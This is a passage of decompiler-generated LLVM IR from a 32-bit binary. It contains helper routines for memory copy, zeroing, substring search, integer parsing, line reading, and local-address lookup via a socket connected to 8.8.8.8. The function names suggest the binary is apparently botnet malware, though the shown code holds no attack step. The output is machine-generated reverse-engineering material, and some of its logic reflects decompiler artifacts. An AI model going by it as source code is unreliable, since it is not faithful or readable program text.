  %v3_10be8 = inttoptr i32 %v2_10be8 to i8*
  %v4_10be8 = load i8, i8* %v3_10be8, align 1
  %v2_10bec = icmp eq i8 %v4_10be8, 0
  br i1 %v2_10bec, label %dec_label_pc_10bf4, label %dec_label_pc_10be4

dec_label_pc_10bf4:                               ; preds = %dec_label_pc_10be4, %bb
  %v0_10bf4 = phi i32 [ %v3_10bd0, %bb ], [ %v1_10be4, %dec_label_pc_10be4 ]
  br label %dec_label_pc_10c00

dec_label_pc_10bfc:                               ; preds = %dec_label_pc_10c00
  %v0_10bfc = load i32, i32* @r1, align 4
  %v1_10bfc = add i32 %v0_10bfc, 1
  %v2_10bfc = inttoptr i32 %v1_10bfc to i8*
  %v3_10bfc = load i8, i8* %v2_10bfc, align 1
  %v4_10bfc = zext i8 %v3_10bfc to i32
  store i32 %v4_10bfc, i32* @r2, align 4
  store i32 %v1_10bfc, i32* @r1, align 4
  %v0_10c00.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_10c00

dec_label_pc_10c00:                               ; preds = %dec_label_pc_10bf4, %dec_label_pc_10bfc
  %v0_10c08.off0 = phi i8 [ %v2_10bd0, %dec_label_pc_10bf4 ], [ %v3_10bfc, %dec_label_pc_10bfc ]
  %v0_10c00 = phi i32 [ %v0_10bf4, %dec_label_pc_10bf4 ], [ %v0_10c00.pr, %dec_label_pc_10bfc ]
  %v1_10c00 = add i32 %v0_10c00, -1
  store i32 %v1_10c00, i32* @r3, align 4
  %v3_10c04 = icmp eq i32 %v0_10c00, 0
  %v2_10c08 = load i32, i32* @r0, align 4
  %v3_10c08 = inttoptr i32 %v2_10c08 to i8*
  store i8 %v0_10c08.off0, i8* %v3_10c08, align 1
  %v4_10c08 = load i32, i32* @r0, align 4
  %v5_10c08 = add i32 %v4_10c08, 1
  store i32 %v5_10c08, i32* @r0, align 4
  br i1 %v3_10c04, label %dec_label_pc_10c10, label %dec_label_pc_10bfc

dec_label_pc_10c10:                               ; preds = %dec_label_pc_10c00
  %v0_10c10 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_10c10

; uselistorder directives
  uselistorder i32 %v0_10c00, { 1, 0 }
  uselistorder i32 %v1_10be4, { 0, 1, 3, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10c00, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_10c18 = icmp eq i32 %arg3, 0
  %v0_10c1c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10c18, i32 %v0_10c1c)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10c24

dec_label_pc_10c24:                               ; preds = %dec_label_pc_10c24, %entry
  %v0_10c24 = phi i32 [ %v1_10c2c, %dec_label_pc_10c24 ], [ 0, %entry ]
  %v2_10c24 = add i32 %v0_10c24, %arg2
  %v3_10c24 = inttoptr i32 %v2_10c24 to i8*
  %v4_10c24 = load i8, i8* %v3_10c24, align 1
  %v4_10c28 = add i32 %v0_10c24, %arg1
  %v5_10c28 = inttoptr i32 %v4_10c28 to i8*
  store i8 %v4_10c24, i8* %v5_10c28, align 1
  %v0_10c2c = load i32, i32* %ip.global-to-local, align 4
  %v1_10c2c = add i32 %v0_10c2c, 1
  store i32 %v1_10c2c, i32* %ip.global-to-local, align 4
  %v9_10c30 = icmp eq i32 %v1_10c2c, %arg3
  br i1 %v9_10c30, label %dec_label_pc_10c38, label %dec_label_pc_10c24

dec_label_pc_10c38:                               ; preds = %dec_label_pc_10c24
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10c2c, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v0_10c3c = load i32, i32* @r1, align 4
  %v2_10c3c = icmp eq i32 %v0_10c3c, 0
  %v0_10c40 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10c3c, i32 %v0_10c40)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10c48

dec_label_pc_10c48:                               ; preds = %dec_label_pc_10c48, %entry
  %v2_10c4c = phi i32 [ %v1_10c50, %dec_label_pc_10c48 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v3_10c4c = load i32, i32* @r0, align 4
  %v4_10c4c = add i32 %v3_10c4c, %v2_10c4c
  %v5_10c4c = inttoptr i32 %v4_10c4c to i8*
  store i8 0, i8* %v5_10c4c, align 1
  %v0_10c50 = load i32, i32* %r2.global-to-local, align 4
  %v1_10c50 = add i32 %v0_10c50, 1
  store i32 %v1_10c50, i32* %r2.global-to-local, align 4
  %v1_10c54 = load i32, i32* @r1, align 4
  %v9_10c54 = icmp eq i32 %v1_10c50, %v1_10c54
  br i1 %v9_10c54, label %dec_label_pc_10c5c, label %dec_label_pc_10c48

dec_label_pc_10c5c:                               ; preds = %dec_label_pc_10c48
  %v1_10c5c = load i32, i32* @r0, align 4
  ret i32 %v1_10c5c

; uselistorder directives
  uselistorder i32 %v1_10c50, { 1, 2, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_10c74 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_10c74, label %dec_label_pc_10c7c, label %dec_label_pc_10c84

dec_label_pc_10c7c:                               ; preds = %dec_label_pc_10c98, %dec_label_pc_10c84, %entry, %dec_label_pc_10cc4
  %storemerge = phi i32 [ %v1_10cc4, %dec_label_pc_10cc4 ], [ -1, %entry ], [ -1, %dec_label_pc_10c84 ], [ -1, %dec_label_pc_10c98 ]
  ret i32 %storemerge

dec_label_pc_10c84:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_10c7c, label %dec_label_pc_10c8c

dec_label_pc_10c8c:                               ; preds = %dec_label_pc_10c84
  br label %dec_label_pc_10ca4

dec_label_pc_10c98:                               ; preds = %bb, %dec_label_pc_10cb8
  %v1_10ca43 = phi i32 [ %v1_10cb8, %dec_label_pc_10cb8 ], [ 0, %bb ]
  %v1_10c98 = add i32 %v0_10cc4, 1
  %v9_10c9c = icmp eq i32 %v1_10c98, %arg2
  br i1 %v9_10c9c, label %dec_label_pc_10c7c, label %dec_label_pc_10ca4

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10c98, %dec_label_pc_10c8c
  %v0_10cc4 = phi i32 [ %v1_10c98, %dec_label_pc_10c98 ], [ 0, %dec_label_pc_10c8c ]
  %v1_10ca4 = phi i32 [ %v1_10ca43, %dec_label_pc_10c98 ], [ 0, %dec_label_pc_10c8c ]
  %v2_10ca4 = add i32 %v1_10ca4, %arg3
  %v3_10ca4 = inttoptr i32 %v2_10ca4 to i8*
  %v4_10ca4 = load i8, i8* %v3_10ca4, align 1
  %v2_10ca8 = add i32 %v0_10cc4, %arg1
  %v3_10ca8 = inttoptr i32 %v2_10ca8 to i8*
  %v4_10ca8 = load i8, i8* %v3_10ca8, align 1
  %v9_10cac = icmp eq i8 %v4_10ca8, %v4_10ca4
  br i1 %v9_10cac, label %dec_label_pc_10cb8, label %bb

bb:                                               ; preds = %dec_label_pc_10ca4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10c98

dec_label_pc_10cb8:                               ; preds = %dec_label_pc_10ca4
  %v1_10cb8 = add i32 %v1_10ca4, 1
  store i32 %v1_10cb8, i32* @ip, align 4
  %v9_10cbc = icmp eq i32 %v1_10cb8, %arg4
  br i1 %v9_10cbc, label %dec_label_pc_10cc4, label %dec_label_pc_10c98

dec_label_pc_10cc4:                               ; preds = %dec_label_pc_10cb8
  %v1_10cc4 = add i32 %v0_10cc4, 1
  br label %dec_label_pc_10c7c

; uselistorder directives
  uselistorder i32 %v1_10cb8, { 1, 2, 0 }
  uselistorder i32 %v1_10ca4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10c98, { 1, 0 }
  uselistorder label %dec_label_pc_10c7c, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_10cdc

dec_label_pc_10cdc:                               ; preds = %.thread, %dec_label_pc_10cf0, %bb, %entry
  %v0_10cdc = phi i32 [ %tmp, %entry ], [ %v5_10cdc, %bb ], [ %v5_10cdc, %dec_label_pc_10cf0 ], [ %v5_10cdc, %.thread ]
  %v1_10cdc = inttoptr i32 %v0_10cdc to i8*
  %v2_10cdc = load i8, i8* %v1_10cdc, align 1
  %v5_10cdc = add i32 %v0_10cdc, 1
  %v7_10ce0 = icmp eq i8 %v2_10cdc, 9
  br i1 %v7_10ce0, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10cdc
  br label %dec_label_pc_10cdc

bb:                                               ; preds = %dec_label_pc_10cdc
  %v8_10ce4 = icmp eq i8 %v2_10cdc, 32
  br i1 %v8_10ce4, label %dec_label_pc_10cdc, label %dec_label_pc_10cf0

dec_label_pc_10cf0:                               ; preds = %bb
  %v7_10cf0 = icmp eq i8 %v2_10cdc, 10
  br i1 %v7_10cf0, label %dec_label_pc_10cdc, label %dec_label_pc_10cf8

dec_label_pc_10cf8:                               ; preds = %dec_label_pc_10cf0
  %v7_10cf8 = icmp eq i8 %v2_10cdc, 45
  br i1 %v7_10cf8, label %dec_label_pc_10de8, label %dec_label_pc_10d00

dec_label_pc_10d00:                               ; preds = %dec_label_pc_10cf8
  %v7_10d00 = icmp eq i8 %v2_10cdc, 43
  br i1 %v7_10d00, label %bb54, label %dec_label_pc_10d10

bb54:                                             ; preds = %dec_label_pc_10d00
  %v2_10d04 = inttoptr i32 %v5_10cdc to i8*
  %v3_10d04 = load i8, i8* %v2_10d04, align 1
  %v6_10d04 = add i32 %v0_10cdc, 2
  br label %dec_label_pc_10d10

dec_label_pc_10d10:                               ; preds = %bb54, %dec_label_pc_10d00, %dec_label_pc_10de8
  %v1_10db839 = phi i32 [ %v5_10de8, %dec_label_pc_10de8 ], [ %v5_10cdc, %dec_label_pc_10d00 ], [ %v6_10d04, %bb54 ]
  %v0_10d3810.in = phi i8 [ %v2_10de8, %dec_label_pc_10de8 ], [ %v2_10cdc, %dec_label_pc_10d00 ], [ %v3_10d04, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_10de8 ], [ 2147483647, %dec_label_pc_10d00 ], [ 2147483647, %bb54 ]
  %v0_10df8 = phi i32 [ 1, %dec_label_pc_10de8 ], [ 0, %dec_label_pc_10d00 ], [ 0, %bb54 ]
  %v2_10d18 = udiv i32 %storemerge1, %arg2
  %v3_10d18 = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_10d38.outer

dec_label_pc_10d38.outer:                         ; preds = %.thread5, %dec_label_pc_10d10
  %v1_10db8.ph = phi i32 [ %v6_10db8, %.thread5 ], [ %v1_10db839, %dec_label_pc_10d10 ]
  %v2_10db4.ph = phi i32 [ %v5_10db4, %.thread5 ], [ 0, %dec_label_pc_10d10 ]
  %v1_10d78.ph.in = phi i8 [ %v3_10db8, %.thread5 ], [ %v0_10d3810.in, %dec_label_pc_10d10 ]
  %v1_10d90.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_10d10 ]
  %v3_10d84 = icmp uge i32 %v2_10db4.ph, %v2_10d18
  %v9_10d84 = icmp eq i32 %v2_10db4.ph, %v2_10d18
  %v2_10d88 = xor i1 %v3_10d84, true
  %v3_10d88 = or i1 %v9_10d84, %v2_10d88
  %v2_10d8c = xor i1 %v9_10d84, true
  %v3_10d8c = and i1 %v3_10d84, %v2_10d8c
  %v2_10dac = icmp eq i1 %v9_10d84, false
  br label %dec_label_pc_10d38

dec_label_pc_10d38:                               ; preds = %dec_label_pc_10d38.outer, %dec_label_pc_10dc0
  %v1_10db8 = phi i32 [ %v5_10dc0, %dec_label_pc_10dc0 ], [ %v1_10db8.ph, %dec_label_pc_10d38.outer ]
  %v1_10d90 = phi i32 [ -1, %dec_label_pc_10dc0 ], [ %v1_10d90.ph, %dec_label_pc_10d38.outer ]
  %v1_10d78.in = phi i8 [ %v2_10dc0, %dec_label_pc_10dc0 ], [ %v1_10d78.ph.in, %dec_label_pc_10d38.outer ]
  %v1_10d78 = zext i8 %v1_10d78.in to i32
  %v1_10d38 = urem i32 %v1_10d78, 256
  %v1_10d3c = add nsw i32 %v1_10d38, -48
  %v1_10d44 = add nsw i32 %v1_10d38, -97
  %v1_10d48 = add nsw i32 %v1_10d78, -48
  %v1_10d4c = add nsw i32 %v1_10d38, -65
  %tmp87 = icmp ult i32 %v1_10d3c, 10
  br i1 %tmp87, label %dec_label_pc_10d7c, label %dec_label_pc_10d54

dec_label_pc_10d54:                               ; preds = %dec_label_pc_10d38
  %v2_10d54 = icmp ugt i32 %v1_10d4c, 24
  %v7_10d54 = icmp eq i32 %v1_10d4c, 25
  %v2_10d58 = xor i1 %v7_10d54, true
  %v3_10d58 = and i1 %v2_10d54, %v2_10d58
  br i1 %v3_10d58, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_10d54
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_10d54, %bb55
  %v0_10d6c15 = phi i32 [ %v1_10d48, %dec_label_pc_10d54 ], [ 0, %bb55 ]
  %v2_10d5c = xor i1 %v2_10d54, true
  %v3_10d5c = or i1 %v7_10d54, %v2_10d5c
  br i1 %v3_10d5c, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_10d6c = phi i32 [ %v0_10d6c15, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_10d58, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_10d64 = icmp ugt i32 %v1_10d44, 24
  %v11_10d64 = icmp eq i32 %v1_10d44, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_10d68 = phi i1 [ %v7_10d54, %bb58 ], [ %v11_10d64, %bb59 ]
  %v0_10d68 = phi i1 [ %v2_10d54, %bb58 ], [ %v6_10d64, %bb59 ]
  %v2_10d68 = xor i1 %v1_10d68, true
  %v3_10d68 = and i1 %v0_10d68, %v2_10d68
  br i1 %v3_10d68, label %dec_label_pc_10dcc, label %dec_label_pc_10d6c

dec_label_pc_10d6c:                               ; preds = %bb60
  %v2_10d6c = icmp eq i32 %v0_10d6c, 0
  %. = select i1 %v2_10d6c, i32 87, i32 55
  %v2_10d78 = sub nsw i32 %v1_10d78, %.
  br label %dec_label_pc_10d7c

dec_label_pc_10d7c:                               ; preds = %dec_label_pc_10d38, %dec_label_pc_10d6c
  %v0_10d9033 = phi i32 [ %v1_10d4c, %dec_label_pc_10d38 ], [ %., %dec_label_pc_10d6c ]
  %v3_10db4 = phi i32 [ %v1_10d48, %dec_label_pc_10d38 ], [ %v2_10d78, %dec_label_pc_10d6c ]
  %v2_10d7c = sub i32 %v3_10db4, %arg2
  %v4_10d7c = xor i32 %v3_10db4, %arg2
  %v5_10d7c = xor i32 %v2_10d7c, %v3_10db4
  %v6_10d7c = and i32 %v5_10d7c, %v4_10d7c
  %v7_10d7c = icmp slt i32 %v6_10d7c, 0
  %v8_10d7c = icmp slt i32 %v2_10d7c, 0
  %v2_10d80 = xor i1 %v8_10d7c, %v7_10d7c
  br i1 %v2_10d80, label %dec_label_pc_10d84, label %dec_label_pc_10dcc

dec_label_pc_10d84:                               ; preds = %dec_label_pc_10d7c
  br i1 %v3_10d88, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_10d84
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_10d84, %bb63
  %v0_10d9032 = phi i32 [ %v0_10d9033, %dec_label_pc_10d84 ], [ 0, %bb63 ]
  br i1 %v3_10d8c, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_10d90 = phi i32 [ %v0_10d9032, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_10d90, 0
  %v4_10d90 = zext i1 %tmp88 to i32
  %v5_10d90 = or i32 %v0_10d90, %v4_10d90
  %v7_10d90 = icmp eq i32 %v5_10d90, 0
  br i1 %v7_10d90, label %dec_label_pc_10d98, label %dec_label_pc_10dc0

dec_label_pc_10d98:                               ; preds = %bb66
  %v2_10da4 = sub i32 %v3_10db4, %v3_10d18
  %v4_10da4 = xor i32 %v3_10db4, %v3_10d18
  %v5_10da4 = xor i32 %v2_10da4, %v3_10db4
  %v6_10da4 = and i32 %v5_10da4, %v4_10da4
  %v7_10da4 = icmp slt i32 %v6_10da4, 0
  %v8_10da4 = icmp slt i32 %v2_10da4, 0
  %v9_10da4 = icmp eq i32 %v3_10db4, %v3_10d18
  %v3_10da8 = xor i1 %v8_10da4, %v7_10da4
  %v4_10da8 = or i1 %v9_10da4, %v3_10da8
  br i1 %v4_10da8, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_10d98
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_10d98
  br i1 %v2_10dac, label %.thread5, label %dec_label_pc_10dc0

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_10db4 = mul i32 %v2_10db4.ph, %arg2
  %v5_10db4 = add i32 %v3_10db4, %v4_10db4
  %v2_10db8 = inttoptr i32 %v1_10db8 to i8*
  %v3_10db8 = load i8, i8* %v2_10db8, align 1
  %v6_10db8 = add i32 %v1_10db8, 1
  br label %dec_label_pc_10d38.outer

dec_label_pc_10dc0:                               ; preds = %thread-pre-split, %bb66
  %v1_10dc0 = inttoptr i32 %v1_10db8 to i8*
  %v2_10dc0 = load i8, i8* %v1_10dc0, align 1
  %v5_10dc0 = add i32 %v1_10db8, 1
  br label %dec_label_pc_10d38

dec_label_pc_10dcc:                               ; preds = %dec_label_pc_10d7c, %bb60
  %v1_10dcc = icmp slt i32 %v1_10d90, 0
  %v2_10df8 = icmp eq i32 %v0_10df8, 0
  br i1 %v1_10dcc, label %dec_label_pc_10df8, label %dec_label_pc_10dd4

dec_label_pc_10dd4:                               ; preds = %dec_label_pc_10dcc
  br i1 %v2_10df8, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_10dd4
  %v2_10dd8 = sub i32 0, %v2_10db4.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_10dd4, %bb69
  %v1_10de4 = phi i32 [ -2147483648, %bb71 ], [ %v2_10db4.ph, %dec_label_pc_10dd4 ], [ %v2_10dd8, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_10de4

dec_label_pc_10de8:                               ; preds = %dec_label_pc_10cf8
  %v1_10de8 = inttoptr i32 %v5_10cdc to i8*
  %v2_10de8 = load i8, i8* %v1_10de8, align 1
  %v5_10de8 = add i32 %v0_10cdc, 2
  br label %dec_label_pc_10d10

dec_label_pc_10df8:                               ; preds = %dec_label_pc_10dcc
  br i1 %v2_10df8, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_10df8
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_10df8
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_10df8, { 1, 0 }
  uselistorder i32 %v2_10da4, { 1, 0 }
  uselistorder i32 %v2_10d7c, { 1, 0 }
  uselistorder i32 %v3_10db4, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_10d54, { 1, 2, 0 }
  uselistorder i1 %v2_10d54, { 1, 0, 2 }
  uselistorder i32 %v1_10d38, { 1, 2, 0 }
  uselistorder i32 %v1_10d78, { 1, 0, 2 }
  uselistorder i32 %v1_10d90, { 1, 0 }
  uselistorder i32 %v1_10db8, { 2, 3, 1, 0 }
  uselistorder i1 %v9_10d84, { 1, 0, 2 }
  uselistorder i1 %v3_10d84, { 1, 0 }
  uselistorder i32 %v2_10db4.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_10d18, { 1, 0, 2 }
  uselistorder i32 %v2_10d18, { 1, 0 }
  uselistorder i32 %v5_10cdc, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_10cdc, { 0, 1, 3, 2 }
  uselistorder i32 25, { 14, 15, 8, 2, 3, 0, 9, 4, 10, 1, 11, 5, 6, 12, 7, 13 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i8 9, { 2, 0, 1 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_10d7c, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_10d38, { 1, 0 }
  uselistorder label %dec_label_pc_10d10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10cdc, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10e08 = load i32, i32* @r4, align 4
  store i32 %v3_10e08, i32* %stack_var_-24, align 4
  %v6_10e08 = load i32, i32* @r5, align 4
  %v9_10e08 = load i32, i32* @r6, align 4
  %v12_10e08 = load i32, i32* @r7, align 4
  %v15_10e08 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10e20

dec_label_pc_10e20:                               ; preds = %dec_label_pc_10e44.dec_label_pc_10e20_crit_edge, %entry
  %v0_10e24 = phi i32 [ %v0_10e24.pre, %dec_label_pc_10e44.dec_label_pc_10e20_crit_edge ], [ %arg3, %entry ]
  %v0_10e20 = phi i32 [ %v5_10e44, %dec_label_pc_10e44.dec_label_pc_10e20_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_10e20, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_10e2c = call i32 @__libc_read(i32 %v0_10e24)
  %v7_10e30 = icmp eq i32 %v1_10e2c, 1
  %v0_10e38 = load i32, i32* @r5, align 4
  br i1 %v7_10e30, label %dec_label_pc_10e38, label %dec_label_pc_10e50

dec_label_pc_10e38:                               ; preds = %dec_label_pc_10e20
  %v1_10e38 = add i32 %v0_10e38, 1
  store i32 %v1_10e38, i32* @r5, align 4
  %v1_10e3c = load i32, i32* @r8, align 4
  %v6_10e40 = icmp slt i32 %v1_10e38, %v1_10e3c
  br i1 %v6_10e40, label %dec_label_pc_10e44, label %.loopexit

dec_label_pc_10e44:                               ; preds = %dec_label_pc_10e38
  %v0_10e44 = load i32, i32* @r4, align 4
  %v1_10e44 = inttoptr i32 %v0_10e44 to i8*
  %v2_10e44 = load i8, i8* %v1_10e44, align 1
  %v3_10e44 = zext i8 %v2_10e44 to i32
  store i32 %v3_10e44, i32* @r3, align 4
  %v5_10e44 = add i32 %v0_10e44, 1
  store i32 %v5_10e44, i32* @r4, align 4
  %v7_10e48 = icmp eq i8 %v2_10e44, 10
  br i1 %v7_10e48, label %dec_label_pc_10e50, label %dec_label_pc_10e44.dec_label_pc_10e20_crit_edge

dec_label_pc_10e44.dec_label_pc_10e20_crit_edge:  ; preds = %dec_label_pc_10e44
  %v0_10e24.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10e20

dec_label_pc_10e50:                               ; preds = %dec_label_pc_10e20, %dec_label_pc_10e44
  %v0_10e50 = phi i32 [ %v1_10e38, %dec_label_pc_10e44 ], [ %v0_10e38, %dec_label_pc_10e20 ]
  %v2_10e50 = icmp eq i32 %v0_10e50, 0
  br i1 %v2_10e50, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_10e50
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_10e38, %dec_label_pc_10e50, %bb
  %v0_10e58 = load i32, i32* @r7, align 4
  %v2_10e5c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10e5c, i32* @r4, align 4
  store i32 %v6_10e08, i32* @r5, align 4
  store i32 %v9_10e08, i32* @r6, align 4
  store i32 %v12_10e08, i32* @r7, align 4
  store i32 %v15_10e08, i32* @r8, align 4
  ret i32 %v0_10e58

; uselistorder directives
  uselistorder i32 %v5_10e44, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10e50, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10e64 = load i32, i32* @r4, align 4
  %v6_10e64 = load i32, i32* @r5, align 4
  %v9_10e64 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_10e74 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10e7c = inttoptr i32 %v0_10e74 to i32*
  store i32 0, i32* %v2_10e7c, align 4
  %v0_10e88 = load i32, i32* %r4.global-to-local, align 4
  %v3_10e8c = call i32 @socket(i32 2, i32 2, i32 %v0_10e88)
  %v7_10e90 = icmp eq i32 %v3_10e8c, -1
  store i32 %v3_10e8c, i32* @r5, align 4
  br i1 %v7_10e90, label %bb, label %dec_label_pc_10ea0

bb:                                               ; preds = %entry
  %v1_10e98 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10eec

dec_label_pc_10ea0:                               ; preds = %entry
  %v2_10eac = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10eac, i32* @r4, align 4
  %v0_10eb8 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_10ecc = call i32 @__libc_connect(i32 %v3_10e8c, i32 %v2_10eac, i32 %v0_10eb8)
  store i32 %v2_10eac, i32* @r1, align 4
  %v2_10ed4 = ptrtoint i32* %stack_var_-20 to i32
  %v0_10ed8 = load i32, i32* @r5, align 4
  %v3_10edc = call i32 @__GI_getsockname(i32 %v0_10ed8, i32 %v2_10eac, i32 %v2_10ed4)
  %v0_10ee0 = load i32, i32* @r5, align 4
  %v1_10ee4 = call i32 @__GI___libc_close(i32 %v0_10ee0)
  br label %dec_label_pc_10eec

dec_label_pc_10eec:                               ; preds = %bb, %dec_label_pc_10ea0
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10ea0 ], [ %v1_10e98, %bb ]
  store i32 %v3_10e64, i32* @r4, align 4
  store i32 %v6_10e64, i32* @r5, align 4
  store i32 %v9_10e64, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10eac, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10e8c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 9, 1, 8, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 25, 27, 24, 4, 26, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 0, 10, 9, 8, 7, 6, 5, 1, 3, 2 }
  uselistorder i32 ()* @__GI___errno_location, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10eec, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_10efc = load i8, i8* %tmp, align 1
  %v4_10efc = zext i8 %v3_10efc to i32
  store i32 %v4_10efc, i32* @r3, align 4
  %v2_10f00 = icmp eq i8 %v3_10efc, 0
  br i1 %v2_10f00, label %bb, label %dec_label_pc_10f14

bb:                                               ; preds = %entry
  br label %dec_label_pc_10f28

dec_label_pc_10f14:                               ; preds = %entry
  br label %dec_label_pc_10f18

dec_label_pc_10f18:                               ; preds = %dec_label_pc_10f18, %dec_label_pc_10f14
  %v0_10f18 = phi i32 [ %v1_10f18, %dec_label_pc_10f18 ], [ 0, %dec_label_pc_10f14 ]
  %v1_10f18 = add i32 %v0_10f18, 1
  %v2_10f1c = add i32 %v1_10f18, %arg2
  %v3_10f1c = inttoptr i32 %v2_10f1c to i8*
  %v4_10f1c = load i8, i8* %v3_10f1c, align 1
  %v6_10f1c = zext i8 %v4_10f1c to i32
  store i32 %v6_10f1c, i32* @r3, align 4
  %v2_10f20 = icmp eq i8 %v4_10f1c, 0
  br i1 %v2_10f20, label %dec_label_pc_10f28, label %dec_label_pc_10f18

dec_label_pc_10f28:                               ; preds = %dec_label_pc_10f18, %bb
  %v0_10f6c21 = phi i32 [ %v4_10efc, %bb ], [ %v1_10f18, %dec_label_pc_10f18 ]
  %v0_10f302 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_10f302, 1
  br i1 %tmp29, label %dec_label_pc_10f80, label %dec_label_pc_10f3c

dec_label_pc_10f3c:                               ; preds = %dec_label_pc_10f28, %dec_label_pc_10f30.backedge
  %v0_10f34.in = phi i32 [ %v0_10f34, %dec_label_pc_10f30.backedge ], [ %v0_10f302, %dec_label_pc_10f28 ]
